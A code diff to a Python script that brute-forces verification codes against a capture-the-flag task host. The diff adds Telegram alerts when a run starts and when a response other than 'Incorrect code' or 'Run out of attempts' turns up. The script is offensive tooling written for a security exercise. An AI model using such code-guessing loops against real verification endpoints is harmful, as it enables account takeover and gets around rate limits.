@@ -4,6 +4,8 @@ from dataclasses import dataclass
 
 import requests
 
+from tg_notigy import send_tg_start, send_tg_found
+
 singup_url = "https://task4.jbctf.com/signup"
 verify_url = "https://task4.jbctf.com/internal_verify_code"
 internal_url = "https://task4.jbctf.com/internal"
@@ -62,6 +64,7 @@ class BruteForce:
         headers = {**def_headers, "cookie": cookie}
 
         iterations = 0
+        send_tg_start(self.log_name)
 
         for iter in range(1_000_000_000_000):
             requests.request("GET", internal_url, headers=headers)
@@ -71,6 +74,8 @@ class BruteForce:
                 if (not response.text.startswith("{\"mssg\":\"Incorrect code")
                         and not response.text.startswith("{\"mssg\":\"Run out of attempts")):
                     self.logger.info(f"{i}: {response.text} : {generateCode(i)}")
+
+                    send_tg_found(self.log_name)
                     input("Found interesting response!")
                     input("Press Enter to continue...")
                 iterations += 1
